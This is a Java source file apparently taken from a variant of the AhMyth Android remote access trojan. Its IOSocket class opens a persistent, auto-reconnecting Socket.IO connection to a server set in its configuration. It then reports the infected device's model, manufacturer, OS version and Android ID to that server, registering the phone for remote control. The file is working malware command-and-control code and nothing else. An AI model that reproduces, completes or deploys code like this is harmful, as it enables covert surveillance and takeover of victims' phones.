package ahmyth.mine.king.ahmyth;

import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;
import com.github.nkzawa.emitter.Emitter;
import org.json.JSONObject;

public class IOSocket {
    private static final String TAG = "IOSocket";
    private static IOSocket ourInstance = new IOSocket();
    private Socket ioSocket;

    private IOSocket() {
        try {
            Log.d(TAG, "Initializing socket connection...");
            
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            Log.d(TAG, "Device ID: " + deviceID);
            
            // Create connection options for Socket.IO v0.9.x
            IO.Options opts = new IO.Options();
            opts.forceNew = true;
            opts.reconnection = true;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};
            
            String url = "http://" + Config.IP + ":" + Config.PORT;
            Log.d(TAG, "Connecting to: " + url + " with options: " + opts.toString());
            
            ioSocket = IO.socket(url, opts);
            
            ioSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, "Socket connected successfully");
                    try {
                        JSONObject deviceInfo = new JSONObject();
                        deviceInfo.put("model", Build.MODEL);
                        deviceInfo.put("manf", Build.MANUFACTURER);
                        deviceInfo.put("release", Build.VERSION.RELEASE);
                        deviceInfo.put("id", deviceID);
                        Log.d(TAG, "Sending device info: " + deviceInfo.toString());
                        ioSocket.emit("join", deviceInfo);
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending device info: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            ioSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, "Socket disconnected");
                }
            });

            ioSocket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.e(TAG, "Connection error: " + args[0]);
                    if (args[0] instanceof Exception) {
                        Exception e = (Exception) args[0];
                        Log.e(TAG, "Detailed error: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            Log.d(TAG, "Starting socket connection...");
            ioSocket.connect();

        } catch (Exception e) {
            Log.e(TAG, "Error initializing socket: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
} 